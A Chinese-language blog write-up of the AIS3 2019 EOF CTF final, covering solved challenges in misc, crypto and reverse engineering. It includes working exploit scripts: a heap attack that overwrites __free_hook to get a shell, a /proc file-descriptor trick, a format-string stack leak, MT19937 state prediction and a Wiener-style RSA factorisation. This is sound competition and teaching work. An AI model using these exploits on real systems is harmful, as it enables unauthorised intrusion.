---
title: AIS3 2019 EOF 決賽 write-up
date: 2020-02-06 23:52:32
categories:
    - write-up
tags:
    - AIS3
    - CTF
---

## 前言

一樣先附個記分板，然後初賽的部分因為我失憶(?)了，所以就不附了，而且我也不記得題目了w

![AIS3 EOF scoreboard](scoreboard.png)

超過半年沒來這裡寫東西了w

這半年做了滿多事的，也開始跟[10sec](https://ctftime.org/team/61603)打了一些比賽，靠著台灣保送名額也在場外打過HITCON Final (Attack & Defense類的CTF)了w

不過自己真的還是好弱，還有很多很多東西還沒學，原本大一上想跟著旁聽計算機安全，不過後來因為發生一些事也沒聽完

這次是splitline突然密我要不要一起組隊打EOF，不然其實也沒考慮要打w

總之最後還是進了決賽，不過超遺憾的是這次決賽因為2019-nCoV(武漢肺炎)的原因直接變成在家打，而且打兩天，其實有點失望，而且實際上打得時候總題不太勁來...

最後拿了第五，不過完全沒感覺w跟上面差距太大了QAQ，而且我們整隊沒人做pwn，感覺超傷的...

總之，先附個官方write-up好了，不過不是很完整

- PWN
    - https://github.com/yuawn/CTF/tree/master/2020/eof-final
    - https://github.com/how2hack/my-ctf-challenges/tree/master/eof_finalctf-2020
- Web
    - https://gist.github.com/CykuTW/edb0d7b39ecdc16a16cc05b149181a02
    - https://hackmd.io/gwfYtqxwTz-DZ9H0g4UUAw?view
    - https://github.com/BookGin/my-ctf-challenges#ais3-eof-ctf-2019-finals
- Crypto
    - https://github.com/how2hack/my-ctf-challenges/tree/master/eof_finalctf-2020
- Misc
    - https://github.com/how2hack/my-ctf-challenges/tree/master/eof_finalctf-2020

接下來把我有做的東東寫一寫好了，雖然因為我太晚起有些flag不是我丟的w，然後剩下可能附個檔案這樣w

阿如果有人想撤掉檔案的話，歡迎PM我，或是去開個[issue](https://github.com/oToToT/oToToT.github.io/issues)w

## Misc

### recovery

載下來拿到一個1GB的diskimage(也所以我沒辦法把他丟上來QAQ)，同時題目給了一個提示

> someone broke my disk! could you help me recover the important message stored in it?

所以直接對著那個file用[TestDisk](https://www.cgsecurity.org/wiki/TestDisk)

然後就找出三個檔案看起來最特別，復原回來後發現裡面是base64後的東西，把它分別decode後拿到

```
EOF{B43kvp_3u34yth
```

```
1ng_b3fORe_Y04_dO_A
```

```
4y_Ch4ng3_t0_d14k}
```

湊起來就是完整的Flag: `EOF{B43kvp_3u34yth1ng_b3fORe_Y04_dO_A4y_Ch4ng3_t0_d14k}`

### TT

yuawn說這是pwn出爛變成misc，可是我最後還是用了一些pwn的知識(?)才做出來QAQ
附個檔案: [tt](TT/tt), [libc-2.29.so](TT/libc-2.29.so)

IDA F5後

```cpp
void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // ST10_4
  int v4; // eax
  int v5; // [rsp+Ch] [rbp-14h]
  char *ptr; // [rsp+18h] [rbp-8h]

  init_0();
  printf("Here you are :P %p\n", &printf);
  while ( 1 )
  {
    v4 = dword_4010--;
    if ( !v4 )
      break;
    info();
    v5 = getint();
    switch ( v5 )
    {
      case 2:
        if ( buf )
        {
          printf("Offset: ");
          ptr = (char *)buf + getint();
          if ( (*((_DWORD *)ptr - 2) & 0xFFFFFFF0) <= 0x80 )
            free(ptr);
        }
        break;
      case 3:
        printf("Data: ");
        read(0, buf, 6uLL);
        break;
      case 1:
        printf("Size: ");
        v3 = getint();
        buf = malloc(v3);
        break;
      default:
        puts(&byte_20B7);
        break;
    }
  }
  exit(0);
}
```

可以看到他free掉之後還繼續寫東西，不過我其實不知道這樣會怎樣w

比賽的時候去看了[CTF-wiki](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/fastbin_attack-zh/#arbitrary-alloc)，發現我只要malloc, free, write, malloc, malloc就可以任意寫值，同時也看到有個東西是\_\_free\_hook，會在free的時候執行他指向的內容，所以我們就把他只到one gadget上就可以get shell了

附個exploit
```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
# context.log_level = 'debug'

# one_gadget = 0x10a38c
# libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')
# o = process('./tt')
one_gadget = 0x106ef8
libc = ELF('libc-2.29.so')
o = remote('eof.ais3.org', 10105)

o.recvuntil(':P')
printf = int(o.recvline().strip(), 16)
libc_pos = printf - libc.sym.printf

print("libc = %x" % libc_pos)

o.recvuntil('choice:')
o.sendline('1')
o.recvuntil('Size:')
o.sendline('100')

o.recvuntil('choice:')
o.sendline('2')
o.recvuntil('Offset:')
o.sendline('0')

o.recvuntil('choice:')
o.sendline('3')
o.recvuntil('Data:')
o.send(p64(libc_pos + libc.sym.__free_hook)[:6])

o.recvuntil('choice:')
o.sendline('1')
o.recvuntil('Size:')
o.sendline('100')

o.recvuntil('choice:')
o.sendline('1')
o.recvuntil('Size:')
o.sendline('100')

o.recvuntil('choice:')
o.sendline('3')
o.recvuntil('Data:')
o.send(p64(libc_pos + one_gadget)[:6])

o.recvuntil('choice:')
o.sendline('2')
o.recvuntil('Offset:')
o.sendline('0')

o.interactive()
```

最後FLag: `EOF{I_th1nk_th1s_sh0u1d_b3_m1sc_TT}`

### Unlucky

題目開起來拿到一個python檔，我們可以nc上去跟他互動
```python
#!/usr/bin/env python3

import os
import shutil
import subprocess

def main():
    rng = open('/dev/urandom', encoding='ISO-8859-1').read(32)
    rng = int.from_bytes(bytes(rng, 'utf-8'), 'little')

    dirname = open('/dev/urandom', encoding='ISO-8859-1').read(32)
    dirname = int.from_bytes(bytes(dirname, 'utf-8'), 'little')
    dirname = '/tmp/{}'.format(dirname)

    filename = open('/dev/urandom', encoding='ISO-8859-1').read(32)
    filename = int.from_bytes(bytes(filename, 'utf-8'), 'little')
    filename = '{}/{}'.format(dirname, filename)

    os.mkdir(dirname)
    f = open(filename, 'w')
    f.write('{}\n'.format(rng))
    f.flush()

    shutil.rmtree(dirname)
    chance()
    guess(rng)

def chance():
    cmd = input('Give you a chance to find the flag: ').strip()[:20]
    try:
        p = subprocess.Popen(cmd.split(), stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        print(p.communicate()[0].decode('utf-8'))
    except:
        pass

def guess(rng):
    lucky = input("Can't find the flag? Then guess the lucky number: ").strip()
    if int(lucky) == rng:
        print('Enjoy your shell :)')
        os.system('/bin/bash')
    else:
        print('May the luck be with you')

if __name__ == "__main__":
    main()
```

然後`ls -al`可以看到裡面有個`flag`跟`readflag`
```
total 92
drwxr-xr-x   1 root root 4096 Feb  4 23:57 .
drwxr-xr-x   1 root root 4096 Feb  4 23:57 ..
-rwxr-xr-x   1 root root    0 Feb  4 23:57 .dockerenv
drwxr-xr-x   1 root root 4096 Feb  4 15:54 bin
drwxr-xr-x   2 root root 4096 Apr 24  2018 boot
drwxr-xr-x   5 root root  340 Feb  4 23:57 dev
drwxr-xr-x   1 root root 4096 Feb  4 23:57 etc
-r--------   1 root root   28 Feb  4 17:03 flag
drwxr-xr-x   1 root root 4096 Feb  4 17:03 home
drwxr-xr-x   1 root root 4096 May 23  2017 lib
drwxr-xr-x   2 root root 4096 Dec  2 12:43 lib64
drwxr-xr-x   2 root root 4096 Dec  2 12:43 media
drwxr-xr-x   2 root root 4096 Dec  2 12:43 mnt
drwxr-xr-x   2 root root 4096 Dec  2 12:43 opt
dr-xr-xr-x 829 root root    0 Feb  4 23:57 proc
-rwsr-xr-x   1 root root 8488 Feb  4 17:03 readflag
-rw-r--r--   1 root root  227 Feb  4 17:03 readflag.c
drwx------   1 root root 4096 Feb  5 00:48 root
drwxrwxr--   1 root root 4096 Dec 19 04:21 run
drwxr-xr-x   1 root root 4096 Feb  4 15:54 sbin
drwxr-xr-x   2 root root 4096 Dec  2 12:43 srv
dr-xr-xr-x  13 root root    0 Feb  4 09:17 sys
drwx-wx-wt   1 root root 4096 Feb  6 18:02 tmp
drwxr-xr-x   1 root root 4096 Dec  2 12:43 usr
drwxr-xr-x   1 root root 4096 Dec  2 12:43 var
```

原本以為直接跑個`./readflag`就好，結果沒成功，後來把它`cat`出來才發現他會先吃個stdin
```c
#include <stdio.h>
#include <stdlib.h>

int main()
{
    FILE *f;
    char flag[0x100];
    char buf[0x100];

    f = fopen("/flag", "r");
    fgets(flag, 0xff, f);
    fgets(buf, 0xff, stdin);
    printf(buf);

    return 0;
}
```

盯了很久感覺應該一定要把檔案就回來才可以，後來發現他雖然rm掉了，可是fd沒關，所以`/proc/self/fd/3`裡還可以把它弄回來，可是因為`subprocess.Popen`的特性，fork出來的小孩不會繼承fd，所以想了一段時間才知道怎麼做，具體來說我們可以nc上去看當前的pid，接著再趕快nc上去一次，這時的pid會是上次的pid+4，所以我們就可以把它的fd cat出來的，這裡附個拿shell的python script

```python
#!/usr/bin/env python3
from pwn import *

o = remote('eof.ais3.org', 29091)

o.recvuntil('flag:')
o.sendline('ps aux --forest')
ps = o.recvuntil('lucky number:').decode('utf-8')
o.close()
ps = ps.split('\n')

pid = 0
for p in ps:
    if 'ps aux --forest' in p:
        pid = int(p[9:14])
        break

o = remote('eof.ais3.org', 29091)
o.recvuntil('flag:')
o.sendline('cat /proc/%d/fd/3' % (pid + 3))
lucky = int(o.recvline().decode('utf-8').strip())
o.recvuntil('lucky number:')
o.sendline(str(lucky))
o.interactive()
```

拿到shell之後是個簡單fmt漏洞，可以構造payload `%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p` 之類的來把stack上的buffer內容弄出來，附個那時的輸入輸出

```
%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p

0x7ffede880a80,0x7f29558f88d0,0x1f,(nil),(nil),(nil),0x5566cb623260,0x696d34667b464f45,0x7431775f5234696c,0x3f78756e694c5f68,0xa7d3f3f,0x7f2955b1f4c0,0x7f2955906f5f,0x7f2955b25710,(nil),(nil),0x7ffede8b6298,0x1958ac0,0x7f29556be787,0x7ffede880ba0,0x7ffede8b6180,0x7f2900000002,(nil),0x7ffede880b00,0x3,0x7ffede880af0,(nil),0x7f2955b25738,(nil),0x1,0x7f2955b25710,(nil),0x6562b026,0x7f2955b25a98,0x7ffede880b98,0x7ffede880bd0,0x7f2955b25710,(nil),0x7f29559071ef,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x70252c70252c,0x7ffede880c70,0x264ee82d9e2a3000,0x5566c97e1820,0x7f295552cb97,0x1,0x7ffede880c78,0x100008000,0x5566c97e177a,(nil),0xc45d71bcb858051,0x5566c97e1670,0x7ffede880c70,(nil),(nil)
```
最後p64還原成string後得到flag: `EOF{f4mili4R_w1th_Linux???}`

## Crypto

### Lucky

拿到一個python寫的腳本，然後我們可以連線上去跟他互動

```python
#!/usr/bin/env python3
import random

class RNG:
    def __init__(self):
        self.f = 1812433253
        (self.w, self.n, self.m, self.r) = (32, 624, 397, 31)
        self.a = 0x9908b0df
        (self.u, self.d) = (11, 0xffffffff)
        (self.s, self.b) = (7, 0x9d2c5680)
        (self.t, self.c) = (15, 0xefc60000)
        self.l = 18
        self.lower_mask = (1 << self.r) - 1
        self.upper_mask = (1 << self.r)

        self.index = self.n + 1
        self.state = [0]*self.n
        self.seed = None

    def srand(self, seed):
        self.seed = seed
        self.state[0] = seed & 0xffffffff

        for i in range(1, self.n):
            self.state[i] = (self.f * (self.state[i-1] ^ (self.state[i-1] >> (self.w-2))) + i) & 0xffffffff
            
    def rand(self):
        if self.seed == None:
            self.srand(random.randrange(1, 0xffffffff))
        if self.index >= self.n:
            self.twist()
        
        y = self.state[self.index]
        y = y ^ ((y >> self.u) & self.d)
        y = y ^ ((y << self.s) & self.b)
        y = y ^ ((y << self.t) & self.c)
        y = y ^ (y >> self.l)

        self.index += 1

        return y & 0xffffffff

    def twist(self):
        for i in range(self.n):
            x = self.state[i] & self.upper_mask
            x += self.state[(i+1) % self.n] & self.lower_mask
            xA = x >> 1
            if x % 2 != 0:
                xA ^= self.a
            self.state[i] = self.state[(i+self.m) % self.n] ^ xA
        self.index = 0

def win():
    print('Congratulation!')
    flag = open('/flag', 'r').read()
    print(flag)
    exit(0)

def shuffle(rng):
    print('How many times do you want to shuffle?')
    n = int(input('> ').strip())
    if n < 0:
        print("Don't mess with your luck >:(")
        exit(-1)
    for _ in range(n):
        rng.rand()

def guess(rng):
    print('Now guess the lucky number!')
    n = int(input('> ').strip())
    lucky_number = rng.rand()
    print('Lucky Number:', lucky_number)
    print('Your Guess:', n)
    if n == lucky_number:
        win()
    else:
        print('Better luck next time :(')
    

if __name__ == "__main__":
    rng = RNG()
    
    for _ in range(3):
        shuffle(rng)
        guess(rng)
```

看了看發現是經典的mt19937實作，看起來跟mt19937的predict很有關係，所以看著[Mersenne Twister Predictor
](https://github.com/kmyk/mersenne-twister-predictor)跟[一篇中國人的Blog](https://liam.page/2018/01/12/Mersenne-twister/)研究了一下後發現我們可以預測mt19937是因為我們可以透過mt19937的輸出回復它當下某個register的內容，而正常那種需要624輸出的作法，就只是奠基在mt19937的register大小就是624，所以我們知道連續624的輸出之後就可以把整個mt19937的狀態記錄下來，接下來就只要模擬就好。

再定睛一看我們這題比較不一樣的是可以指定要第幾個register的內容，但是只能問兩次，接著就必須回答下一次的輸出。

觀察了一下mt19937做twist的部分，發現它會利用$r_i$的high bit跟$r_{i+1}$的low 31個bit算出一些東西後，把$r_i$變成$r_{i+397}$ xor 一些東西 (其中這裡的$r$代表mt19937的register)，所以我們就可以考慮預測twist後的那個$r_0$，這樣的話我們會需要twist前的$r_0, r_1, r_{397}$，不過$r_0$的部分我們只需要一個bit，所以可以直接random撞撞看就好了，這樣我們就只要兩個輸出就可以預測下一個輸出了XD

怎麼做的部分就是我們拿到輸出的第1個數跟第397個數(0-base)還原出$r_1, r_{397}$接著讓他剛好twist一遍，我們也照著模擬twist的操作就可以拿到twist後的$r_0$了XD

附個exploit
```python
#!/usr/bin/env python3
from pwn import *
import random

# o = process('./lucky')
o = remote('eof.ais3.org', 39091)

# untempering from 
# https://github.com/kmyk/mersenne-twister-predictor/blob/master/mt19937predictor.py
def untempering(y):
    y ^= (y >> 18)
    y ^= (y << 15) & 0xefc60000
    y ^= ((y <<  7) & 0x9d2c5680) ^ ((y << 14) & 0x94284000) ^ ((y << 21) & 0x14200000) ^ ((y << 28) & 0x10000000)
    y ^= (y >> 11) ^ (y >> 22)
    return y

if __name__ == "__main__":
    lower_mask = (1 << 31) - 1
    upper_mask = (1 << 31)
    x0 = random.randint(0, 0xffffffff)

    # shuffle 1 time to get x1
    o.recvuntil('>')
    o.sendline('1')
    # guess lol
    o.recvuntil('>')
    o.sendline('1')
    o.recvuntil('Lucky Number:')
    x1 = untempering(int(o.recvline().strip()))
    print('x1 = %d' % x1)

    # shuffle 395 to get x397
    o.recvuntil('>')
    o.sendline('395')
    # guess lol
    o.recvuntil('>')
    o.sendline('1')
    o.recvuntil('Lucky Number:')
    x397 = untempering(int(o.recvline().strip()))
    print('x397 = %d' % x397)
    
    # shuffle 624 - 397 to twist
    o.recvuntil('>')
    o.sendline('226')
    
    # twist
    y = x0 & upper_mask
    y += x1 & lower_mask
    yA = y >> 1
    if y % 2 != 0:
        yA ^= 0x9908b0df
    y = x397 ^ yA
    y = y ^ ((y >> 11) & 0xffffffff)
    y = y ^ ((y <<  7) & 0x9d2c5680)
    y = y ^ ((y << 15) & 0xefc60000)
    y = y ^  (y >> 18)
    y &= 0xffffffff
    
    o.recvuntil('>')
    o.sendline(str(y))
    o.interactive()
```

最後Flag: `EOF{4noTh3r_m3tH0d_t0_Br3aK_M3rSeNne_tWistEr}` 

### Art

一樣拿到一個python寫的腳本，然後我們可以連線上去跟他互動
```python
#!/usr/bin/env python3
from Crypto.Util.number import *

nbit = 384

def gcd(a, b):
    if b == 0:
        return (a, 0, 1)
    g, x, y = gcd(b, a % b)
    return (g, y - (a // b) * x, x)

def modinv(a, m):
    g, x, y = gcd(m, a)
    if g != 1:
        return -1
    return x % m

def gen():
    x, y, z, u = [getPrime(nbit) for _ in range(4)]
    phi = (x-1)*(y-1)*(z-1)*(u-1)
    n = x*y*z*u
    while True:
        d = getRandomInteger(192)
        e = modinv(d, phi)
        if e == -1:
            continue
        break
    return [n, e], [x, y, z, u]


def main():
    pub, pri = gen()
    print (f'n = {pub[0]}')
    print (f'e = {pub[1]}')
    for _ in range(4):
        factor = int(input('give me one prime factor of n : '))
        if factor in pri:
            print ('correct!')
            del pri[pri.index(factor)]
        else:
            print ('you need a stronger machine to bruteforce, here is your link : https://aws.amazon.com/ec2/pricing/on-demand/?nc1=h_ls')
            exit(255)
    print ('nice, here is your flag:')
    with open('flag', 'r') as f:
        print (f.read())

if __name__ == '__main__':
    main()
```

發現是個四個質數的RSA，而且$d$特別的小，所以就在想可不可以做Wiener's attack

然而看了[wikipedia](https://en.wikipedia.org/wiki/Wiener%27s_attack)，只覺得可以拿到$\varphi(N), d$，但是不像兩個質數的RSA，我構造不出一個方式可以分解$N$，後來是google `wiener attack multiple factor`，看到一篇[文章](https://link.springer.com/content/pdf/10.1007/3-540-36492-7_25.pdf)，裡面給出了一種類似miller rabin的做法可以分解$N$，來證明拿到$d$其實跟分解$N$差不多難，同時它也有給出好的機率證明它的演算法。

最後照著寫了一波就做完了w

sol.py
```python
#!/usr/bin/env python3
from pwn import *
import wiener

# o = process('./run.py')
o = remote('ais3eof.zoolab.org', 9000)

o.recvuntil('n = ')
N = int(o.recvline().strip())
o.recvuntil('e = ')
e = int(o.recvline().strip())

print('N = %d' % N)
print('e = %d' % e)
d, phi = wiener.get_d_phi(N, e)
print('d = %d' % d)
print('phi = %d' % phi)
if d != -1:
    a, b, c, d = wiener.factorize4(e, d, N)
    o.recvuntil('give me one prime factor of n')
    o.sendline(str(a))
    o.recvuntil('give me one prime factor of n')
    o.sendline(str(b))
    o.recvuntil('give me one prime factor of n')
    o.sendline(str(c))
    o.recvuntil('give me one prime factor of n')
    o.sendline(str(d))
    o.interactive()
```

wiener.py
```python
import ContFrac
import arithm
import random
from Crypto.Util.number import isPrime, getPrime

def get_d_phi(N, e):
    '''
    get d, phi by using continuous
    fraction apporximation
    where e * d = k * phi(N) + 1
    '''
    fr = ContFrac.r_to_fr(e, N)
    co = ContFrac.convfr(fr)
    for k, d in co:
        if k == 0:
            continue
        phi = (e * d - 1) // k
        if phi % (2 ** 4) != 0:
            # phi should be a multiple to 2^4
            continue
        possible = True
        for _ in range(100):
            # test the property of phi
            m = random.randint(0, N - 1)
            if arithm.qpow(arithm.qpow(m, e, N), d, N) != m:
                possible = False
                break
        if possible:
            return d, phi
    return -1, -1

def get_factor(e, d, N):
    '''
    get factor of n with e and d
    '''
    kphi = e * d - 1
    u, t = kphi, 0
    while u % 2 == 0:
        u >>= 1
        t += 1

    pre_w = N - 1
    w = random.randint(2, N - 2)
    w = arithm.qpow(w, u, N)
    for s in range(t):
        if w == 1:
            if pre_w == N - 1:
                break
            return arithm.gcd(pre_w + 1, N)
        pre_w = w
        w = w * w % N
    return -1

def factorize2(e, d, N):
    f = get_factor(e, d, N)
    while f == -1:
        f = get_factor(e, d, N)
    return f, N//f

def factorize3(e, d, N):
    f = get_factor(e, d, N)
    while f == -1:
        f = get_factor(e, d, N)
    if not isPrime(f):
        f = N // f
    p, q = factorize2(e, d, N // f)
    return p, q, f

def factorize4(e, d, N):
    f = get_factor(e, d, N)
    while f == -1:
        f = get_factor(e, d, N)
        if f == -1:
            continue
        if not isPrime(f):
            f = N // f
        if not isPrime(f):
            f = -1
    p, q, r = factorize3(e, d, N // f)
    return f, p, q, r

if __name__ == '__main__':
    '''
    N should be in P*Q*R*S form
    where P,Q,R,S are prime
    '''
    p = getPrime(64)
    q = getPrime(64)
    r = getPrime(64)
    s = getPrime(64)
    d = getPrime(16)
    n = p * q * r * s
    phi = (p - 1) * (q - 1) * (r - 1) * (s - 1)
    while arithm.gcd(d, phi) != 1:
        d = getPrime(16)
    e = arithm.inv(d, phi)
    print('p =', p)
    print('q =', q)
    print('r =', r)
    print('s =', s)
    print('d =', d)
    print('e =', e)
    print('phi =', phi)
    print('kphi =', e * d - 1)
    print(factorize4(e, d, n))
```

ContFrac.py
```python
def r_to_fr(a, b):
    '''
    converts rational fraction a/b to
    a list of partial quotients [p0, ..., pn]
    '''
    fr = []
    while b > 0:
        fr.append(a // b)
        c = a
        a = b
        b = c % b
    return fr

def fr_to_r(fr):
    '''
    converts a continued fraction [p0, ..., pn]
    to a rational fraction a/b.
    '''
    if len(fr) == 0:
        return 0, 1
    a, b = fr[-1], 1
    for p in reversed(fr[:-1]):
        # p + 1 / (a / b)
        # p + b / a
        # (p * a + b) / a
        a, b = p * a + b, a
    return a, b

def convfr(fr):
    '''
    computes the list of convergents
    using the list of partial quotients
    '''
    c = []
    for i in range(len(fr)):
        c.append(fr_to_r(fr[:i]))
    return c

if __name__ == '__main__':
    assert(r_to_fr(103, 24) == [4, 3, 2, 3])
    assert(r_to_fr(21, 73) == [0, 3, 2, 10])
    assert(fr_to_r(r_to_fr(21, 73)) == (21, 73))
    assert(fr_to_r(r_to_fr(1290312, 239081)) == (1290312, 239081))
    print('OK')
```

arithm.py
```python
'''
from https://github.com/pablocelayes/rsa-wiener-attack/blob/master/Arithmetic.py
'''

def egcd(a,b):
    '''
    Extended Euclidean Algorithm
    returns x, y, gcd(a,b) such that ax + by = gcd(a,b)
    '''
    u, u1 = 1, 0
    v, v1 = 0, 1
    while b:
        q = a // b
        u, u1 = u1, u - q * u1
        v, v1 = v1, v - q * v1
        a, b = b, a - q * b
    return u, v, a

def gcd(a,b):
    '''
    2.8 times faster than egcd(a,b)[2]
    '''
    a,b=(b,a) if a<b else (a,b)
    while b:
        a,b=b,a%b
    return a

def inv(e,n):
    '''
    d such that de = 1 (mod n)
    e must be coprime to n
    this is assumed to be true
    '''
    return egcd(e,n)[0]%n

def qpow(a, b, m):
    '''
    equals to pow(a, b) % m
    '''
    r = 1
    while b:
        if b & 1:
            r = r * a % m
        b >>= 1
        a = a * a % m
    return r % m
```

最後Flag: `EOF{Did_you_USe_Wiener_Or_Boneh_Durfee?}`

### Train Revenge

附個檔案[server.py](Train_Revenge/server.py), [BlockCipher.py](Train_Revenge/BlockCipher.py)

然後留個坑，沒看完這題w

## Reverse

### Gift

拿到一個[gz檔](Gift/gift.gz)，解開拿到一個binary，拖進IDA後看到一個很不知道要幹嘛的東西

```cpp
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  char v3; // r12
  signed int i; // [rsp+Ch] [rbp-234h]
  char s2[272]; // [rsp+10h] [rbp-230h]
  char s1; // [rsp+120h] [rbp-120h]
  unsigned __int64 v8; // [rsp+228h] [rbp-18h]

  v8 = __readfsqword(0x28u);
  strcpy(
    s2,
    "0YO7DD8QP2QBM8AUFP4P9RJUB6KVYE1PHMMPYWNEWR64P3L68E21LUPH15UTVDJ3NET7654PBSK1P7E8037H88M4YGJ0AK8USN52KGDDF57OBKBJXL14"
    "R2B2XP8G20YLWX9J0ROPBMCX41J4Q5Q3F2HQ02BCR8G9I1UMSPE4973XYLA4OJOMWN22XJ91SF0XMU9GJ6XJ06JIV37LHA3L0ZIMQC1F7RLIP2HYDBOS"
    "WC4LV7M0XKQMMBUEYXRLYI5J");
  puts("Tell me the secret you found");
  __isoc99_scanf("%256s", &s1);
  if ( !strcmp(&s1, s2) )
  {
    for ( i = 0; i <= 3389077; ++i )
    {
      v3 = byte_601080[i];
      byte_601080[i] = s2[i % strlen(s2)] ^ v3;
    }
    puts("Ok, that sounds good");
    write(1, byte_601080, 0x33B696uLL);
  }
  else
  {
    puts("wrong");
  }
  return 0LL;
}
```

嘗試把那個字串塞進stdin後噴出一堆莫名其妙的東西，後來把他輸出成檔案後，`file`一下發現輸出是個一個類似結構的東西，連續做了好幾次後就覺得是要一職重複做這件事，但是很麻煩的是我又不知道要怎麼把那個字串弄出來，`strings`出來的東西也不好`grep`，最後決定掛個LD_PRELOAD，把`strcmp`直接蓋成跟`strcpy`差不多的東西，具體如下

```c
int strcmp ( const char * str1, const char * str2 ) {
    char *a = str1, *b = str2;
    while (*b != '\0')
        *(a++) = *(b++);
    *a = '\0';
    return 0;
}
```

這樣他每次檢查都會通過，而且就幫我填好buffer了XD

接著重複跑個大概1000多次後，輸出的東西就變成flag了XD

最後Flag: `EOF{re_re_re_re_reverse_U_ju5t_reverse_m3_1000_times!!}`

### Vault

附個檔案 [vault.html](Vault/vault_html), [vault.js](Vault/vault_js), [vault.wasm](Vault/vault_wasm)

splitline做的@@

不太會逆web assembly

### Tree

附個檔案 [tree](Tree/tree)

IDA開起來看到是一個Treap based的Link/Cut Tree就放棄了w

超級不喜歡Link/Cut Tree的說(其實只是我爛)

想說拿angr直接炸，不過最後也沒炸出來w

附個出題者在聊天室留的解

> 就是經過觀察之後會發現，每次會檢查樹上一條鏈的總和是否為X，然後檢查1000次 然後把輸入裡面的六個字代入2^(1~6)然後剩下的代入2^7，然後用gdb看看適用什麼東西跟X做檢查
> 最後整理一下就會得到一堆2k7
> 一堆的N元一次方程式
> 然後丟z3就解掉了

### Compiler

附個檔案 [compiler](Compiler/compiler)

不過我沒看這題@@

## Web

這次web看起來都很血腥就沒看了，而且想說splitline的web比我強太多了，除非有看起來很水但他懶得做的我再去看看就好了w

### babyRMI2

splitline做的，初賽我也沒做babyRMI，看到Java就逃了w

下次應該認真看的

附個檔案 [src.zip](babyRMI2/src.zip)

### Babyfirst Revenge: Remastered

不熟windows command line，但總覺得也該學一下，完整可以看官方的解

### Imagination

沒看@@

splitline說是蓋python cache，不過他好像沒空做完QAQ

### CureURL

Cyku出的，不過我不熟Redis，所以看到redis就跳過了QAQ

附個檔案 [cureurl.zip](CureURL/cureurl.zip)

## Pwn

今年還是不會Pwn QAQ

附個檔案在這

### Whitehole

[whitehole](Whitehole/whitehole), [libc-2.27.so](Whitehole/libc-2.27.so)

### Blackhole

[blackhole](Blackhole/blackhole), [libc-2.27.so](Blackhole/libc-2.27.so)

### EasierROP

[easierROP](EasierROP/easierROP), [libc.so.6](EasierROP/libc.so.6)

### nonono_revenge

[nonono_revenge](nonono_revenge/nonono_revenge), [fake_flag](nonono_revenge/fake_flag), [libc.so.6](nonono_revenge/libc.so.6)

### TT Revenge

[tt_revenge](TT_Revenge/tt_revenge), [libc-2.29.so](TT_Revenge/libc-2.29.so)
